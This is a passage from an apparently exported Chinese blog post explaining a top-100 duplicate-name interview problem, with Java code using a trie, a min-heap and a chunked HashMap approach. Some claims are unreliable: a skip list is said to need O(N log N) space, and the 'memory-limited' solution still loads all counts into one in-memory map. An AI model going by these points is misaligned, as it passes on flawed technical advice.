Sort），中序遍历trie可以得到排序。</p>\n<p><strong>Trie树缺点</strong>：</p>\n<p>当所有关键字都不具有相同或类似的前缀，空间消耗过大.</p>\n<h2 id=\"6-Trie树的基本操作\"><a href=\"#6-Trie树的基本操作\" class=\"headerlink\" title=\"6. Trie树的基本操作:\"></a>6. Trie树的基本操作:</h2><ul>\n<li><p>插入:将一个字符串逐字符插入到Trie树中</p>\n</li>\n<li><p>查找:检查Trie树中是否存在某个字符串</p>\n</li>\n<li><p>前缀匹配:查找所有以某个前缀开头的字符串</p>\n</li>\n<li><p>删除:从Trie树中删除一个字符串</p>\n</li>\n</ul>\n<h2 id=\"7-Trie树的应用场景\"><a href=\"#7-Trie树的应用场景\" class=\"headerlink\" title=\"7. Trie树的应用场景:\"></a>7. Trie树的应用场景:</h2><p>1.字符串检索:</p>\n<ul>\n<li><p>应用场景:快速检索字典中的单词</p>\n</li>\n<li><p>使用原因:Trie树通过逐字符匹配,可以在O(L)时间内完成字符串的检索,其中L是字符串的长度,比传统的线性搜索更加高效</p>\n</li>\n</ul>\n<p>2.自动补全:</p>\n<ul>\n<li><p>应用场景:搜索引擎和输入法中的自动补全功能</p>\n</li>\n<li><p>适用原因:Trie树可以通过前缀查找快速提供所有以给定前缀开头的单词,有效提升用户输入体验</p>\n</li>\n</ul>\n<p>3.前缀匹配:</p>\n<ul>\n<li><p>应用场景:寻找以特定前缀开头的所有字符串,如电话号码前缀匹配</p>\n</li>\n<li><p>适用原因:Trie树天生适合处理前缀匹配问题,可以在O(L)时间内找到所有以特定前缀开头的字符串</p>\n</li>\n</ul>\n<p>4.词频统计:</p>\n<ul>\n<li><p>应用场景:文本分析中统计单词出现频率</p>\n</li>\n<li><p>适用原因:Trie树可以在插入过程中记录每个单词的出现次数,通过遍历Trie树可以快速统计所有单词的频率</p>\n</li>\n</ul>\n<p>为什么适合这些场景:</p>\n<p>5.多模式匹配:</p>\n<ul>\n<li><p>应用场景:从文本中同时搜索多个模式(模式匹配算法)</p>\n</li>\n<li><p>适用原因:Trie树可以构建多个模式的结构,通过一次遍历文本同时匹配多个模式,提高匹配效率</p>\n</li>\n</ul>\n<p>为什么适用于这些场景:</p>\n<p>1.空间效率:</p>\n<ul>\n<li><p>共享前缀:Trie树通过共享前缀节点，减少了重复存储相同前缀的空间开销。</p>\n</li>\n<li><p>节省内存:对于大量前缀相同的字符串集合，Trie树显著节省内存使用。</p>\n</li>\n</ul>\n<p>2.时间效率:</p>\n<ul>\n<li><p>O(L)复杂度:插入、查找和前缀匹配操作的时间复杂度为O(L),其中L是字符串的长度,显著提高了操作效率</p>\n</li>\n<li><p>快速检索:相比于其他线性结构(如数组或链表),Trie树在处理大量字符串时更快</p>\n</li>\n</ul>\n<h2 id=\"8-Trie树的代码实现\"><a href=\"#8-Trie树的代码实现\" class=\"headerlink\" title=\"8. Trie树的代码实现:\"></a>8. Trie树的代码实现:</h2><p>以下是一个 参考代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.HashMap;  </span><br><span class=\"line\">import java.util.Map;  </span><br><span class=\"line\">import java.util.PriorityQueue;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class TrieNode &#123;  </span><br><span class=\"line\">    Map&lt;Character, TrieNode&gt; children;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public TrieNode() &#123;  </span><br><span class=\"line\">        children = new HashMap&lt;&gt;();  </span><br><span class=\"line\">        count = 0;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class Trie &#123;  </span><br><span class=\"line\">    private TrieNode root;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public Trie() &#123;  </span><br><span class=\"line\">        root = new TrieNode();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public void insert(String name) &#123;  </span><br><span class=\"line\">        TrieNode node = root;  </span><br><span class=\"line\">        for (char ch : name.toCharArray()) &#123;  </span><br><span class=\"line\">            node = node.children.computeIfAbsent(ch, k -&gt; new TrieNode());  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        node.count++;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public void getAllNames(TrieNode node, StringBuilder prefix, PriorityQueue&lt;NameCount&gt; minHeap, int k) &#123;  </span><br><span class=\"line\">        if (node == null) return;  </span><br><span class=\"line\">        if (node.count &gt; 0) &#123;  </span><br><span class=\"line\">            if (minHeap.size() &lt; k) &#123;  </span><br><span class=\"line\">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class=\"line\">            &#125; else if (node.count &gt; minHeap.peek().count) &#123;  </span><br><span class=\"line\">                minHeap.poll();  </span><br><span class=\"line\">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        for (Map.Entry&lt;Character, TrieNode&gt; entry : node.children.entrySet()) &#123;  </span><br><span class=\"line\">            prefix.append(entry.getKey());  </span><br><span class=\"line\">            getAllNames(entry.getValue(), prefix, minHeap, k);  </span><br><span class=\"line\">            prefix.deleteCharAt(prefix.length() - 1);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public PriorityQueue&lt;NameCount&gt; getTopKNames(int k) &#123;  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class=\"line\">        getAllNames(root, new StringBuilder(), minHeap, k);  </span><br><span class=\"line\">        return minHeap;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class NameCount implements Comparable&lt;NameCount\\&gt; &#123;  </span><br><span class=\"line\">    String name;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public NameCount(String name, int count) &#123;  </span><br><span class=\"line\">        this.name = name;  </span><br><span class=\"line\">        this.count = count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public int compareTo(NameCount other) &#123;  </span><br><span class=\"line\">        return Integer.compare(this.count, other.count);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public String toString() &#123;  </span><br><span class=\"line\">        return name + &quot;: &quot; + count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class Main &#123;  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">        String\\[\\] names = &#123;&quot;张伟&quot;, &quot;王伟伟&quot;, &quot;王芳&quot;, &quot;李伟&quot;, &quot;李娜&quot;&#125;; // 示例数据  </span><br><span class=\"line\">        int k = 100; // 找到前100个重名人数最多的姓名  </span><br><span class=\"line\">  </span><br><span class=\"line\">        Trie trie = new Trie();  </span><br><span class=\"line\">        for (String name : names) &#123;  </span><br><span class=\"line\">            trie.insert(name);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; topKNames = trie.getTopKNames(k);  </span><br><span class=\"line\">        while (!topKNames.isEmpty()) &#123;  </span><br><span class=\"line\">            System.out.println(topKNames.poll());  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"9-TOP-N问题发散\"><a href=\"#9-TOP-N问题发散\" class=\"headerlink\" title=\"9. TOP N问题发散:\"></a>9. TOP N问题发散:</h2><p>上面的问题进行改进一下, 如果我们对内存有一个限制,比如:要求内存的使用不能超过2G,</p>\n<p>注意，这里的内存受限，尽量使用磁盘处理。</p>\n<blockquote>\n<p>这里使用hashmap，而不适用 trie树的原因是？</p>\n<p>trie树是按照字符为粒度组织树的节点的，进行磁盘操作性能不高，而且进行磁盘操作时算法更加复杂。</p>\n<p>hashmap 是以key为单位操作的， 磁盘操作的效率高。而且 hashmap 统计的时候，代码简洁清晰。</p>\n</blockquote>\n<p>尽管我们hashmap，也不能直接将所有数据加载到内存中处理,</p>\n<p>所以可以采取分治的策略,使用外部排序和哈希映射的方法,</p>\n<p>以下是详细的步骤:</p>\n<p>1.分块读取数据:将14亿条记录分成多个较小的块,每次读取一部分数据到内存中进行处理</p>\n<p>2.哈希映射统计词频:对每个块的数据进行哈希映射,统计每个名字出现的次数,将结果写入到磁盘文件</p>\n<p>3.合并词频统计结果:读取所有中间文件,合并词频统计结果,得到全局的词频统计</p>\n<p>4.使用小顶堆找出前100个重复最多的名字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.\\*;  </span><br><span class=\"line\">import java.util.HashMap;  </span><br><span class=\"line\">import java.util.Map;  </span><br><span class=\"line\">import java.util.PriorityQueue;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class NameCount implements Comparable&lt;NameCount\\&gt; &#123;  </span><br><span class=\"line\">    String name;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public NameCount(String name, int count) &#123;  </span><br><span class=\"line\">        this.name = name;  </span><br><span class=\"line\">        this.count = count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public int compareTo(NameCount other) &#123;  </span><br><span class=\"line\">        return Integer.compare(this.count, other.count);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public String toString() &#123;  </span><br><span class=\"line\">        return name + &quot;: &quot; + count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class ExternalMemoryTopK &#123;  </span><br><span class=\"line\">    private static final int CHUNK\\_SIZE = 1000000; // 每个块处理100万条记录  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) throws IOException &#123;  </span><br><span class=\"line\">        String inputFile = &quot;names.txt&quot;;  </span><br><span class=\"line\">        String outputFile = &quot;top100names.txt&quot;;  </span><br><span class=\"line\">        int k = 100;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第一步：分块读取数据并统计词频  </span><br><span class=\"line\">        int chunkIndex = 0;  </span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new FileReader(inputFile));  </span><br><span class=\"line\">        String line;  </span><br><span class=\"line\">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class=\"line\">            Map&lt;String, Integer&gt; frequencyMap = new HashMap&lt;&gt;();  </span><br><span class=\"line\">            int lineCount = 0;  </span><br><span class=\"line\">            while (line != null &amp;&amp; lineCount &lt; CHUNK\\_SIZE) &#123;  </span><br><span class=\"line\">                frequencyMap.put(line, frequencyMap.getOrDefault(line, 0) + 1);  </span><br><span class=\"line\">                line = reader.readLine();  </span><br><span class=\"line\">                lineCount++;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">            writeFrequencyMapToFile(frequencyMap, &quot;chunk\\_&quot; + chunkIndex + &quot;.txt&quot;);  </span><br><span class=\"line\">            chunkIndex++;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        reader.close();  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第二步：合并所有块的词频统计结果  </span><br><span class=\"line\">        Map&lt;String, Integer&gt; globalFrequencyMap = new HashMap&lt;&gt;();  </span><br><span class=\"line\">        for (int i = 0; i &lt; chunkIndex; i++) &#123;  </span><br><span class=\"line\">            mergeFrequencyMapFromFile(globalFrequencyMap, &quot;chunk\\_&quot; + i + &quot;.txt&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 第三步：使用小顶堆找出前100个重复最多的名字  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class=\"line\">        for (Map.Entry&lt;String, Integer&gt; entry : globalFrequencyMap.entrySet()) &#123;  </span><br><span class=\"line\">            if (minHeap.size() &lt; k) &#123;  </span><br><span class=\"line\">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class=\"line\">            &#125; else if (entry.getValue() &gt; minHeap.peek().count) &#123;  </span><br><span class=\"line\">                minHeap.poll();  </span><br><span class=\"line\">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 输出结果  </span><br><span class=\"line\">        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));  </span><br><span class=\"line\">        while (!minHeap.isEmpty()) &#123;  </span><br><span class=\"line\">            writer.write(minHeap.poll().toString());  </span><br><span class=\"line\">            writer.newLine();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        writer.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    private static void writeFrequencyMapToFile(Map&lt;String, Integer&gt; frequencyMap, String filename) throws IOException &#123;  </span><br><span class=\"line\">        BufferedWriter writer = new BufferedWriter(new FileWriter(filename));  </span><br><span class=\"line\">        for (Map.Entry&lt;String, Integer&gt; entry : frequencyMap.entrySet()) &#123;  </span><br><span class=\"line\">            writer.write(entry.getKey() + &quot; &quot; + entry.getValue());  </span><br><span class=\"line\">            writer.newLine();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        writer.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    private static void mergeFrequencyMapFromFile(Map&lt;String, Integer&gt; globalFrequencyMap, String filename) throws IOException &#123;  </span><br><span class=\"line\">        BufferedReader reader = new BufferedReader(new FileReader(filename));  </span><br><span class=\"line\">        String line;  </span><br><span class=\"line\">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class=\"line\">            String\\[\\] parts = line.split(&quot; &quot;);  </span><br><span class=\"line\">            String name = parts\\[0\\];  </span><br><span class=\"line\">            int count = Integer.parseInt(parts\\[1\\]);  </span><br><span class=\"line\">            globalFrequencyMap.put(name, globalFrequencyMap.getOrDefault(name, 0) + count);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        reader.close();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"10-topK问题-典型的解题思路\"><a href=\"#10-topK问题-典型的解题思路\" class=\"headerlink\" title=\"10. topK问题,典型的解题思路\"></a>10. topK问题,典型的解题思路</h2><p>这是一种典型的topK问题,一般的问法如下：</p>\n<p>从一堆数据中选出多少个最大或最小数？</p>\n<p>解题思想：</p>\n<ol>\n<li><p>先统计数量, 使用前缀树，hashmap等</p>\n</li>\n<li><p>再用小顶堆或者 大顶堆</p>\n</li>\n</ol>\n<p>取大用小，取小用大。简单来说就是取最大的K个数就用小顶堆，取最小的K个数，就用大顶堆</p>\n<p>取海量数据里面最小的K个数？</p>\n<p>要找出数组中最小的K个数，就要构造一个有K个元素的大顶堆，因为大顶堆的堆顶值是最大的，其它元素和堆顶的元素比较，大于堆顶的元素，换一个元素继续，小于堆顶的元素，将堆顶元素出堆，将更小的元素插入堆顶，如此反复，堆里面就是最小的数</p>\n<p>取海量数据里面最大的K个数？</p>\n<p>要找出数组中最大的K个数，就要构造一个有K个元素的小顶堆，因为小顶堆的堆顶值是最小的，其它元素和堆顶的元素比较，大于堆顶的元素，堆顶的元素出堆，将元素插入到小顶堆，将更大的元素换到堆中，如此反复，堆里面就是最大的数</p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<h1 id=\"阿里面试：全国14亿个姓名，统计出重名最多的前100个\"><a href=\"#阿里面试：全国14亿个姓名，统计出重名最多的前100个\" class=\"headerlink\" title=\"阿里面试：全国14亿个姓名，统计出重名最多的前100个\"></a>阿里面试：全国14亿个姓名，统计出重名最多的前100个</h1><blockquote>\n<p>全国14亿人的数据中，统计出重名人数最多的前100位姓名</p>\n</blockquote>\n<p>最近有小伙伴在面试阿里，遇到这个面试题。小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p>\n<p><strong>TOP N面试题是常见的算法题。</strong></p>\n<p>TOP N 统计的面试题，是一道非常常见的题目，大家一定要掌握好。</p>\n<h2 id=\"1-问题描述\"><a href=\"#1-问题描述\" class=\"headerlink\" title=\"1. 问题描述:\"></a>1. 问题描述:</h2><p>我们需要从全国14亿人的数据中，统计出重名人数最多的前100位姓名</p>\n<h2 id=\"2-问题分析\"><a href=\"#2-问题分析\" class=\"headerlink\" title=\"2. 问题分析:\"></a>2. 问题分析:</h2><p>我们的目标：是找到重名人数最多的前100个姓名,</p>\n<p>这意味着需要两步：</p>\n<ul>\n<li><p>需要有一个高效的数据结构来统计每个名字出现的次数,</p>\n</li>\n<li><p>并快速找到出现次数最多的前100个名字.</p>\n</li>\n</ul>\n<p>所以这个问题就转化成了下一个问题： 使用一种低成本、高性能的数据结构，来统计每个名字出现的次数。</p>\n<h2 id=\"3-如何选择一种最低成本、最高性能的数据结构？\"><a href=\"#3-如何选择一种最低成本、最高性能的数据结构？\" class=\"headerlink\" title=\"3. 如何选择一种最低成本、最高性能的数据结构？\"></a>3. 如何选择一种最低成本、最高性能的数据结构？</h2><p>常规的数据结构，选型如下:</p>\n<ul>\n<li><strong>数组</strong>:</li>\n</ul>\n<p>如果姓名的字符集范围很大(支持所有的Unicode字符)，那么，需要极大且稀疏的数组,导致内存浪费严重,也不适合处理动态长度和多样性的字符串集合</p>\n<ul>\n<li><p><strong>链表</strong>:</p>\n<p>链表的插入和查找的操作时间复杂度为O(N), 并且，在大规模数据下性能低下,也不适合快速查找的场景</p>\n</li>\n<li><p><strong>跳表</strong>:</p>\n</li>\n</ul>\n<p>跳表的插入、删除和查找操作的平均事件复杂度都是O(logN)，</p>\n<p>跳表式空间换时间的思想，主要是它需要额外的空间来维护多级索引，每个元素在最坏的情况下需要额外的存储空间，导致总的空间复杂度为O(N log N),</p>\n<p>在频繁的插入和查询的场景中，效率不高。</p>\n<p>来到我们现在这个场景，统计每个名字出现的次数时，不如哈希表在时间和空间的效率高效，哈希表的O(1)时间复杂度更适合大规模的数据频繁的插入和查询。</p>\n<ul>\n<li><strong>哈希表:</strong></li>\n</ul>\n<p>哈希表的插入和查找的时间复杂度都是O(1),</p>\n<p>但是在极端的情况下，哈希冲突会导致时间复杂度退化到O(N)，</p>\n<p>在空间效率中，哈希表需要额外的空间来维护键值对，来到这个场景，空间效率和哈希冲突都有潜在风险，</p>\n<p>最重要的是哈希表不能共享前缀，在处理大量的具有共同前缀的数据时候，也不适合。</p>\n<ul>\n<li><strong>平衡二叉搜索树(如AVL树或红黑树)</strong>:</li>\n</ul>\n<p>能够维护有序数据,支持快速的插入、删除和查找操作,但在字符串的比较上,性能不如哈希表和Trie高效</p>\n<ul>\n<li><strong>前缀树</strong>:</li>\n</ul>\n<p>前缀树通过共享前缀节点,节省了大量存储空间, 实现了成本的最低化</p>\n<p>前缀树对于字符串操作非常高效, 在这个问题中, 有很多名字共享相同前缀, Trie的结构能有效利用这一特点。</p>\n<p>经过上面的分析,能够看到Trie更适合统计每个名字出现的次数</p>\n<h2 id=\"4-如何快速筛选出Top-100？\"><a href=\"#4-如何快速筛选出Top-100？\" class=\"headerlink\" title=\"4. 如何快速筛选出Top 100？\"></a>4. 如何快速筛选出Top 100？</h2><p>当知道了所有姓名出现的次数之后,、怎么样快速筛选出其中出现次数最多的前100个?</p>\n<p>首先想到的是直接排序。</p>\n<p>这个问题中,对14亿数据直接排序会有效率的问题，操作非常耗时。</p>\n<p>所以直接排序， 这种方法不可取。</p>\n<p>我们的目标是找到次数最多的前100个,可以利用堆的性质来完成。</p>\n<p>小顶堆总是保持堆顶为当前堆中最小的元素，这样可以确保当新的元素插入时，如果新元素大于堆顶元素，堆顶元素会被替换掉</p>\n<p>使用小顶堆的步骤:</p>\n<p>1.初始化一个小顶堆:设为100</p>\n<p>2.遍历每个姓名及其出现的次数:</p>\n<ul>\n<li><p>如果堆的大小小于100，将当前姓名及其出现次数插入堆中。</p>\n</li>\n<li><p>如果当前姓名的出现次数大于堆顶元素的出现次数，则移除堆顶元素，并将当前姓名及其出现次数插入堆中。</p>\n</li>\n</ul>\n<p>3.遍历完所有的姓名后,堆中即为重名人数最多的前100个姓名</p>\n<p>所以解决这个问题使用了前缀树 + 小顶堆</p>\n<h2 id=\"5-前缀树Trie树介绍\"><a href=\"#5-前缀树Trie树介绍\" class=\"headerlink\" title=\"5. 前缀树Trie树介绍\"></a>5. 前缀树Trie树介绍</h2><p>在计算机科学中，trie，又称前缀树或字典树，使用一些单词来构建Trie树,如下图所示:</p>\n<p><img src=\"/./2024/06/02/%E7%BB%9F%E8%AE%A1%E5%85%A8%E5%9B%BD%E9%87%8D%E5%90%8D%E6%9C%80%E5%A4%9A%E7%9A%84%E5%89%8D100%E4%B8%AA/1.png\"></p>\n<p>从图片中可以看到一些有意思的特性:</p>\n<ul>\n<li><p>根节点没有数据</p>\n</li>\n<li><p>从根节点到某一个节点,将他们的路径进行连接就组成了对应的字符串</p>\n</li>\n</ul>\n<p>定义:</p>\n<blockquote>\n<p>Trie树，又称为前缀树或字典树, 是一种用于高效存储和检索字符串集合的数据结构, 每个节点代表一个字符, 边表示从一个字符到另一个字符的路径, Trie树通过共享相同前缀的节点来节省存储空间</p>\n</blockquote>\n<p>Trie树是一种有序树，用于保存关联数组，其中的键通常是字符串。</p>\n<p>与二叉查找树不同，Trie树 的 键不是直接保存在节点中，而是由节点在树中的位置决定。</p>\n<p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>\n<p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>\n<p>trie中的键通常是字符串，但也可以是其它的结构。</p>\n<p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p>\n<p>比如，bitwise trie中的键是一串位元，可以用于表示整数或者内存地址</p>\n<p><strong>Trie树基本性质</strong></p>\n<p>1，根节点不包含字符，除根节点意外每个节点只包含一个字符。</p>\n<p>2，从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。</p>\n<p>3，每个节点的所有子节点包含的字符串不相同。</p>\n<p><strong>Trie树优点</strong>：</p>\n<p>可以最大限度地减少无谓的字符串比较，故可以用于词频统计和大量字符串排序。</p>\n<p>跟哈希表比较：</p>\n<p>1，最坏情况时间复杂度比hash表好</p>\n<p>2，没有冲突，除非一个key对应多个值（除key外的其他信息）</p>\n<p>3，自带排序功能（类似Radix Sort），中序遍历trie可以得到排序。</p>\n<p><strong>Trie树缺点</strong>：</p>\n<p>当所有关键字都不具有相同或类似的前缀，空间消耗过大.</p>\n<h2 id=\"6-Trie树的基本操作\"><a href=\"#6-Trie树的基本操作\" class=\"headerlink\" title=\"6. Trie树的基本操作:\"></a>6. Trie树的基本操作:</h2><ul>\n<li><p>插入:将一个字符串逐字符插入到Trie树中</p>\n</li>\n<li><p>查找:检查Trie树中是否存在某个字符串</p>\n</li>\n<li><p>前缀匹配:查找所有以某个前缀开头的字符串</p>\n</li>\n<li><p>删除:从Trie树中删除一个字符串</p>\n</li>\n</ul>\n<h2 id=\"7-Trie树的应用场景\"><a href=\"#7-Trie树的应用场景\" class=\"headerlink\" title=\"7. Trie树的应用场景:\"></a>7. Trie树的应用场景:</h2><p>1.字符串检索:</p>\n<ul>\n<li><p>应用场景:快速检索字典中的单词</p>\n</li>\n<li><p>使用原因:Trie树通过逐字符匹配,可以在O(L)时间内完成字符串的检索,其中L是字符串的长度,比传统的线性搜索更加高效</p>\n</li>\n</ul>\n<p>2.自动补全:</p>\n<ul>\n<li><p>应用场景:搜索引擎和输入法中的自动补全功能</p>\n</li>\n<li><p>适用原因:Trie树可以通过前缀查找快速提供所有以给定前缀开头的单词,有效提升用户输入体验</p>\n</li>\n</ul>\n<p>3.前缀匹配:</p>\n<ul>\n<li><p>应用场景:寻找以特定前缀开头的所有字符串,如电话号码前缀匹配</p>\n</li>\n<li><p>适用原因:Trie树天生适合处理前缀匹配问题,可以在O(L)时间内找到所有以特定前缀开头的字符串</p>\n</li>\n</ul>\n<p>4.词频统计:</p>\n<ul>\n<li><p>应用场景:文本分析中统计单词出现频率</p>\n</li>\n<li><p>适用原因:Trie树可以在插入过程中记录每个单词的出现次数,通过遍历Trie树可以快速统计所有单词的频率</p>\n</li>\n</ul>\n<p>为什么适合这些场景:</p>\n<p>5.多模式匹配:</p>\n<ul>\n<li><p>应用场景:从文本中同时搜索多个模式(模式匹配算法)</p>\n</li>\n<li><p>适用原因:Trie树可以构建多个模式的结构,通过一次遍历文本同时匹配多个模式,提高匹配效率</p>\n</li>\n</ul>\n<p>为什么适用于这些场景:</p>\n<p>1.空间效率:</p>\n<ul>\n<li><p>共享前缀:Trie树通过共享前缀节点，减少了重复存储相同前缀的空间开销。</p>\n</li>\n<li><p>节省内存:对于大量前缀相同的字符串集合，Trie树显著节省内存使用。</p>\n</li>\n</ul>\n<p>2.时间效率:</p>\n<ul>\n<li><p>O(L)复杂度:插入、查找和前缀匹配操作的时间复杂度为O(L),其中L是字符串的长度,显著提高了操作效率</p>\n</li>\n<li><p>快速检索:相比于其他线性结构(如数组或链表),Trie树在处理大量字符串时更快</p>\n</li>\n</ul>\n<h2 id=\"8-Trie树的代码实现\"><a href=\"#8-Trie树的代码实现\" class=\"headerlink\" title=\"8. Trie树的代码实现:\"></a>8. Trie树的代码实现:</h2><p>以下是一个 参考代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.HashMap;  </span><br><span class=\"line\">import java.util.Map;  </span><br><span class=\"line\">import java.util.PriorityQueue;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class TrieNode &#123;  </span><br><span class=\"line\">    Map&lt;Character, TrieNode&gt; children;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public TrieNode() &#123;  </span><br><span class=\"line\">        children = new HashMap&lt;&gt;();  </span><br><span class=\"line\">        count = 0;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class Trie &#123;  </span><br><span class=\"line\">    private TrieNode root;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public Trie() &#123;  </span><br><span class=\"line\">        root = new TrieNode();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public void insert(String name) &#123;  </span><br><span class=\"line\">        TrieNode node = root;  </span><br><span class=\"line\">        for (char ch : name.toCharArray()) &#123;  </span><br><span class=\"line\">            node = node.children.computeIfAbsent(ch, k -&gt; new TrieNode());  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        node.count++;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public void getAllNames(TrieNode node, StringBuilder prefix, PriorityQueue&lt;NameCount&gt; minHeap, int k) &#123;  </span><br><span class=\"line\">        if (node == null) return;  </span><br><span class=\"line\">        if (node.count &gt; 0) &#123;  </span><br><span class=\"line\">            if (minHeap.size() &lt; k) &#123;  </span><br><span class=\"line\">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class=\"line\">            &#125; else if (node.count &gt; minHeap.peek().count) &#123;  </span><br><span class=\"line\">                minHeap.poll();  </span><br><span class=\"line\">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        for (Map.Entry&lt;Character, TrieNode&gt; entry : node.children.entrySet()) &#123;  </span><br><span class=\"line\">            prefix.append(entry.getKey());  </span><br><span class=\"line\">            getAllNames(entry.getValue(), prefix, minHeap, k);  </span><br><span class=\"line\">            prefix.deleteCharAt(prefix.length() - 1);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public PriorityQueue&lt;NameCount&gt; getTopKNames(int k) &#123;  </span><br><span class=\"line\">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class=\"line\">        getAllNames(root, new StringBuilder(), minHeap, k);  </span><br><span class=\"line\">        return minHeap;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">class NameCount implements Comparable&lt;NameCount\\&gt; &#123;  </span><br><span class=\"line\">    String name;  </span><br><span class=\"line\">    int count;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public NameCount(String name, int count) &#123;  </span><br><span class=\"line\">        this.name = name;  </span><br><span class=\"line\">        this.count = count;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Override  </span><br><span class=\"line\">    public int compareTo(NameCount other) &#123;  </span><br><span class=\"line\">        return Integer.compare(this.count, 